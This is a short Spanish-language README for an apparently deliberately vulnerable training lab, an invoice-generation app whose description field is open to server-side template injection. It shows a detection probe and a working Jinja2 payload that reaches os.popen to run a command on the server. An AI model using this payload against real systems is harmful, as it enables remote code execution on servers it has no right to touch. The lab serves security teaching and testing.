## 🚨 Server Side Template Injection (SSTI-Lab)
- Aplicación vulnerable a inyección de plantillas en el lado del servidor.
- Se trata de una aplicación de generación de facturas en la que existe un campo vulnerable a inyección. 

El campo vulnerable a inyección es el de la descripción de la factura. Con un input como este podriamos descubrir la vulnerabilidad:

```sh
{{7*7}}
```

Con este otro input podemos ejecutar comandos en el servidor:
```sh
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```